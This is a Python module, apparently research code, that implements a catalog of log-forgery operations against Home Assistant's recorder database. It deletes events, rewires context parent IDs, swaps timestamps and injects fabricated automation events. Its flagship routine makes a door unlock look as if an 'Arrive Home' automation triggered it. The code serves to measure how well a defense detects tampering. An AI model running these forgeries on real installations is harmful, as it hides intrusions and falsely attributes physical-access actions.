"""FT-1 .. FT-12 — the predeclared forgery catalog, as executable operations.

Every forgery reports the ROWS IT WROTE, because b (database write count) is the
HEADLINE BUDGET: it is the resource the defense actually rations, and anchoring
frequency f is its dual. Matched-budget comparison is what stops "the composed
attack won" collapsing into "the composed attack spent more".

Renderer-level invariants a working forgery MUST satisfy (all three MEASURED in
M1; none is visible from the schema):
  (i)   a fabricated cause must PRECEDE its effect in wall-clock order, because
        HA's logbook builds its context lookup from rows streaming in time order;
  (ii)  old_state_id must be chained or an injected row is invisible;
  (iii) the automation's own entity state row must be injected, or the actuation
        ends up UNATTRIBUTED (SEV-1) rather than MISATTRIBUTED (SEV-2).
"""
from __future__ import annotations
import json, os, sqlite3


class Forger:
    def __init__(self, db: str):
        self.db = db
        self.writes = 0
        self.log = []

    def _con(self):
        return sqlite3.connect(self.db, timeout=30)

    def _mid(self, con, entity):
        r = con.execute("SELECT metadata_id FROM states_meta WHERE entity_id=?",
                        (entity,)).fetchone()
        return r[0] if r else None

    def _note(self, ft, n, **kw):
        self.writes += n
        self.log.append(dict(ft=ft, rows=n, **kw))

    # ------------------------------------------------------------- F_del
    def ft1_delete_own_action(self, adv_ctx: bytes):
        con = self._con()
        n = con.execute("DELETE FROM events WHERE context_id_bin=?", (adv_ctx,)).rowcount
        con.commit(); con.close()
        self._note("FT-1", n, ctx=adv_ctx.hex()); return n

    def ft2_delete_intermediate(self, ctx: bytes = None):
        """Delete an intermediate trigger/condition node, orphaning its subtree.
        Targets a REAL automation_triggered node: the adversary's own context has
        none, so scoping the delete to it was a silent no-op (0 writes)."""
        con = self._con()
        row = con.execute("""SELECT e.event_id FROM events e
                               JOIN event_types et ON et.event_type_id=e.event_type_id
                              WHERE et.event_type='automation_triggered'
                              ORDER BY e.time_fired_ts DESC LIMIT 1""").fetchone()
        n = 0
        if row:
            n = con.execute("DELETE FROM events WHERE event_id=?", (row[0],)).rowcount
        con.commit(); con.close()
        self._note("FT-2", n, targeted="latest automation_triggered"); return n

    def ft3_delete_segment(self, lo: float, hi: float):
        con = self._con()
        n = con.execute("DELETE FROM states WHERE last_updated_ts>=? AND last_updated_ts<?",
                        (lo, hi)).rowcount
        n += con.execute("DELETE FROM events WHERE time_fired_ts>=? AND time_fired_ts<?",
                         (lo, hi)).rowcount
        con.commit(); con.close()
        self._note("FT-3", n, window=[lo, hi]); return n

    # ------------------------------------------------------------- F_rep
    def ft4_reparent(self, adv_ctx: bytes, new_parent: bytes, entity: str,
                     new_ctx: bytes | None = None):
        """PURE edge re-parent. Writes ONLY context columns; state_id, state
        value and every timestamp are left byte-identical. MEASURED: B2 is
        mechanically blind to this."""
        con = self._con(); cur = con.cursor()
        before = cur.execute(
            """SELECT state_id,state,last_updated_ts FROM states
                WHERE context_id_bin=? AND metadata_id=
                (SELECT metadata_id FROM states_meta WHERE entity_id=?)""",
            (adv_ctx, entity)).fetchall()
        if new_ctx:
            cur.execute("""UPDATE states SET context_id_bin=?, context_parent_id_bin=?
                            WHERE context_id_bin=? AND metadata_id=
                            (SELECT metadata_id FROM states_meta WHERE entity_id=?)""",
                        (new_ctx, new_parent, adv_ctx, entity))
        else:
            cur.execute("""UPDATE states SET context_parent_id_bin=?
                            WHERE context_id_bin=? AND metadata_id=
                            (SELECT metadata_id FROM states_meta WHERE entity_id=?)""",
                        (new_parent, adv_ctx, entity))
        n = cur.rowcount; con.commit()
        after = cur.execute(
            """SELECT state_id,state,last_updated_ts FROM states
                WHERE context_id_bin=? AND metadata_id=
                (SELECT metadata_id FROM states_meta WHERE entity_id=?)""",
            (new_ctx or adv_ctx, entity)).fetchall()
        con.close()
        identical = sorted(before) == sorted(after)
        self._note("FT-4", n, content_byte_identical=identical)
        return {"rows": n, "content_byte_identical": identical}

    def ft5_reparent_branch(self, ctx: bytes, new_parent: bytes):
        con = self._con()
        n = con.execute("UPDATE events SET context_parent_id_bin=? WHERE context_id_bin=?",
                        (new_parent, ctx)).rowcount
        con.commit(); con.close(); self._note("FT-5", n); return n

    def ft6_swap_siblings(self, k1: int, k2: int):
        con = self._con(); cur = con.cursor()
        a = cur.execute("SELECT last_updated_ts FROM states WHERE state_id=?", (k1,)).fetchone()
        b = cur.execute("SELECT last_updated_ts FROM states WHERE state_id=?", (k2,)).fetchone()
        if not (a and b):
            con.close(); return 0
        cur.execute("UPDATE states SET last_updated_ts=? WHERE state_id=?", (b[0], k1))
        cur.execute("UPDATE states SET last_updated_ts=? WHERE state_id=?", (a[0], k2))
        con.commit(); con.close(); self._note("FT-6", 2); return 2

    # ------------------------------------------------------------- F_inj
    def inject_state(self, entity: str, value: str, ctx: bytes,
                     par: bytes | None, ts: float, ft="FT-7"):
        con = self._con(); cur = con.cursor()
        m = self._mid(con, entity)
        if m is None:
            con.close(); return None
        # (ii) chain old_state_id or the logbook will not render it as a change
        prev = cur.execute("""SELECT state_id FROM states WHERE metadata_id=?
                               AND last_updated_ts < ? ORDER BY last_updated_ts DESC LIMIT 1""",
                           (m, ts)).fetchone()
        cur.execute("""INSERT INTO states (metadata_id,state,last_updated_ts,last_changed_ts,
                         last_reported_ts,context_id_bin,context_parent_id_bin,origin_idx,
                         old_state_id) VALUES (?,?,?,?,?,?,?,0,?)""",
                    (m, value, ts, ts, ts, ctx, par, prev[0] if prev else None))
        sid = cur.lastrowid; con.commit(); con.close()
        self._note(ft, 1, entity=entity, state=value); return sid

    def inject_event(self, etype: str, data: dict, ctx: bytes,
                     par: bytes | None, ts: float, ft="FT-7"):
        con = self._con(); cur = con.cursor()
        r = cur.execute("SELECT event_type_id FROM event_types WHERE event_type=?",
                        (etype,)).fetchone()
        if r:
            etid = r[0]
        else:
            cur.execute("INSERT INTO event_types (event_type) VALUES (?)", (etype,))
            etid = cur.lastrowid
        shared = json.dumps(data, sort_keys=True)
        cur.execute("INSERT INTO event_data (hash,shared_data) VALUES (?,?)",
                    (abs(hash(shared)) % (2**31), shared))
        cur.execute("""INSERT INTO events (event_type_id,data_id,origin_idx,time_fired_ts,
                         context_id_bin,context_parent_id_bin) VALUES (?,?,0,?,?,?)""",
                    (etid, cur.lastrowid, ts, ctx, par))
        eid = cur.lastrowid; con.commit(); con.close()
        self._note(ft, 1, etype=etype); return eid

    # ---------------------------------------------------------- composed
    def ft10_causal_laundering(self, adv_ctx: bytes, entity: str,
                               automation: str, trigger_entity: str, base_ts: float):
        """FLAGSHIP. MEASURED b = 7 row-writes. Verified at L0 against HA's own
        logbook renderer; CE_b = 1 at matched budget by exact enumeration."""
        A, T = os.urandom(16), os.urandom(16)
        # (i) fabricated causes must PRECEDE the effect
        self.inject_state(trigger_entity, "on", T, None, base_ts - 2.0, "FT-10")
        self.inject_event("automation_triggered",
                          {"entity_id": automation, "name": "Arrive Home",
                           "source": "state of %s" % trigger_entity},
                          A, T, base_ts - 1.5, "FT-10")
        self.inject_event("call_service",
                          {"domain": entity.split(".")[0], "service": "unlock"},
                          A, T, base_ts - 1.4, "FT-10")
        # (iii) the automation's OWN entity state row, or it is SEV-1 not SEV-2
        self.inject_state(automation, "on", A, T, base_ts - 1.3, "FT-10")
        rep = self.ft4_reparent(adv_ctx, T, entity, new_ctx=A)
        dele = self.ft1_delete_own_action(adv_ctx)
        return {"budget_b": self.writes, "reparent": rep, "deleted": dele,
                "fake_automation_ctx": A.hex(), "fake_trigger_ctx": T.hex()}

    def ft11_branch_laundering(self, ctx: bytes, new_parent: bytes):
        self.ft2_delete_intermediate(ctx)
        self.ft5_reparent_branch(ctx, new_parent)
        return {"budget_b": self.writes}

    def ft12_segment_substitution(self, lo: float, hi: float, entity: str,
                                  automation: str, trigger_entity: str):
        self.ft3_delete_segment(lo, hi)
        A, T = os.urandom(16), os.urandom(16)
        self.inject_state(trigger_entity, "on", T, None, lo + 0.1, "FT-12")
        self.inject_event("automation_triggered",
                          {"entity_id": automation, "name": "Evening Routine"},
                          A, T, lo + 0.2, "FT-12")
        self.inject_state(entity, "unlocked", A, T, lo + 0.3, "FT-12")
        return {"budget_b": self.writes}
